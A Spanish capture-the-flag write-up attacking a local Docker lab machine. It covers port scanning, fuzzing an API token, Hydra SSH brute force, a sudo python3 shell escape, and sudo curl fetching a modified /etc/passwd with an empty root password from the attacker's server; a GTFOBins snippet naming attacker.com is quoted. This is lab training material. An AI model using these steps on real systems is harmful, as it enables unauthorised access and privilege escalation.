Desplegamos en contenedor y nos indica que la máquina víctima tiene la IP-->172.17.0.2

Vamos a comprobar trazabilidad:
```bash
ping -c 1 172.17.0.2
```
```
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.085 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.085/0.085/0.085/0.000 ms
```
un paquete transmitido, uno recibido, cero perdidos.

## FASE DE ENUMERACIÓN

Escaneamos puertos abiertos, así como los servicios que corren por ellos y sus versiones por si son vulnerables
```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN PuertosYservicios
```
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 19:f1:08:79:13:c4:42:b8:6c:c8:a3:3e:f5:39:a3:59 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLJ6c9b2FZ+2/lQs+7H8j9Vkf83is1rphGqioHJ5Udw/zuClnjeZCCWS3dDNfsWKsmC4bDpP+fbL5p7z3Vpj5z0=
|   256 9b:93:02:4e:d2:08:f7:d7:eb:90:48:e4:48:17:1b:f5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILi2T2o/qZXjV7oo43koui/mZwrmfb2NgDELa++lV/sJ
5000/tcp open  http    syn-ack ttl 64 Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: \xC2\xBFQu\xC3\xA9 es una API?
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
```

-Puerto 22 SSH versión 9.2 no vulnerable, sin credenciales, lo descartamos

-Puerto 5000 http, nos vamos a centrar en él

Lanzamos un whatweb, por si nos reporta algo interesante

```bash
whatweb http://172.17.0.2:5000
```
```
http://172.17.0.2:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Title[¿Qué es una API?], Werkzeug[2.2.2]
```

entro en la página y miro el código fuente sin ver nada interesante, leyendo la página supongo que hay un directorio "api" y hago fuzzing desde el mismo
```bash
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  "http://172.17.0.2:5000/api/FUZZ"
```
```
000000188:   401        3 L      5 W        31 Ch       "users"   
```

me mueve al mismo, y es como que no estuviera autorizado, en la página principal puedo ller esto:

```
Para obtener la lista de usuarios autenticándote con un token, puedes usar:

curl -H "Authorization: Bearer password_secreta" http://localhost:5000/api/directorio_oculto
```

así pués hago un fuzzing con un diccionario en la cabecera:
```bash
wfuzz -c --hc=404 --hh=31 -w /usr/share/wordlists/rockyou.txt  -H "Authorization: Bearer FUZZ" "http://172.17.0.2:5000/api/users"
```
```
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

000000028:   200        10 L     14 W       89 Ch       "password1"
```

teniendo ya el token lanzo un curl:
```bash
curl -H "Authorization: Bearer password1" "172.17.0.2:5000/api/users"
```
```
[
  {
    "id": 1,
    "nombre": "bob"
  },
  {
    "id": 2,
    "nombre": "dylan"
  }
]

```
tenemos dos user, bob y dylan, nos hacemos un diccionario con ambos y vamos a lanzar un ataque de fuerza bruta al puerto 22 dónde corre SSH

## FASE DE INTRUSIÓN

Lanzamos un ataque de fuerza bruta con hydra al puerto 22 dónde corre SSH:
```bash
hydra -L nombres.txt  -P /usr/share/wordlists/rockyou.txt -t 16 -V -f -I ssh://172.17.0.2
````
```
[ATTEMPT] target 172.17.0.2 - login "bob" - pass "password1" - 28 of 28688799 [child 6] (0/1)
[ATTEMPT] target 172.17.0.2 - login "bob" - pass "soccer" - 29 of 28688799 [child 12] (0/1)
[ATTEMPT] target 172.17.0.2 - login "bob" - pass "anthony" - 30 of 28688799 [child 14] (0/1)
[ATTEMPT] target 172.17.0.2 - login "bob" - pass "friends" - 31 of 28688799 [child 5] (0/1)
[22][ssh] host: 172.17.0.2   login: bob   password: password1
```

ahora nos conectamos por SSH:
```bash
 ssh bob@172.17.0.2
```
cuando nos pide la contraseña introducimos: password1

## ESCALADA DE PRIVILEGIOS

Lanzamos un cat al /etc/passwd para ver los usuarios:
```bash
cat /etc/passwd | grep sh$
```
```
root:x:0:0:root:/root:/bin/bash
balulero:x:1000:1000:balulero,,,:/home/balulero:/bin/bash
bob:x:1001:1001:bob,,,:/home/bob:/bin/bash
```
miramos si estamos en algún grupo privilegiado con id y no, miramos con printenv si hay algo en la variable de entorno y tampoco,
miramos con sudo -l si tenemos algún privilegio
```bash
sudo -l
```
```
Matching Defaults entries for bob on 9ea8319d3a14:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User bob may run the following commands on 9ea8319d3a14:
    (balulero) NOPASSWD: /usr/bin/python3
```
y podemos ejecutar como usuario balilero python 3, miramos el binario en 
```
https://gtfobins.github.io/gtfobins/python/
```
y nos dice que con sudo, se puede abusar de esta manera:
````
sudo python -c 'import os; os.system("/bin/sh")'
```
lo ajustamos:
```bash
sudo -u balulero /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

Ya somos el usuario balulero,
miramos con sudo -l:
```bash
sudo -l
```
```
Matching Defaults entries for balulero on 9ea8319d3a14:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User balulero may run the following commands on 9ea8319d3a14:
    (ALL) NOPASSWD: /usr/bin/curl
```
y podemos usar curl con cualquier usuario incluido root, miramos en :
```
https://gtfobins.github.io/gtfobins/curl/#sudo
```
```
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Fetch a remote file via HTTP GET request.

URL=http://attacker.com/file_to_get
LFILE=file_to_save
sudo curl $URL -o $LFILE
```
podemos subir a la maquina victima un archivo como root, lo más facil es cambiar los privilegios en el /etc/passwd
hacemos un cat del original y nos hacemos uno nuevo quedando así:
```
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
balulero:x:1000:1000:balulero,,,:/home/balulero:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bob:x:1001:1001:bob,,,:/home/bob:/bin/bash
```
montamos un servidor en nuestra máquina atacante dónde tenemos el archivo modificado de passwd:
```bash
sudo python3 -m http.server 80
```
y ahora en la máquina victima introducimos lo siguiente:

```
URL=http://172.17.0.1/passwd #dónde el 172.17.0.1 es nuestra ip atacante con el archivo modificado passwd
LFILE=/etc/passwd # el archivo que vamos a reemplazar, cómo queremos guardar el archivo que bajamos
sudo -u root /usr/bin/curl $URL -o $LFILE # como root bajamos el archivo y lo guardamos
```
```
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1187  100  1187    0     0   243k      0 --:--:-- --:--:-- --:--:--  289k
```
hacemos un cat para ver que ha sido modificado
```bash
cat /etc/passwd
```
```
root::0:0:root:/root:/bin/bash
```
habiendo quitado la "x" ya solo nos queda :
```bash
su root
```
```
root@9ea8319d3a14:/home/bob# is
bash: is: command not found
root@9ea8319d3a14:/home/bob#
```
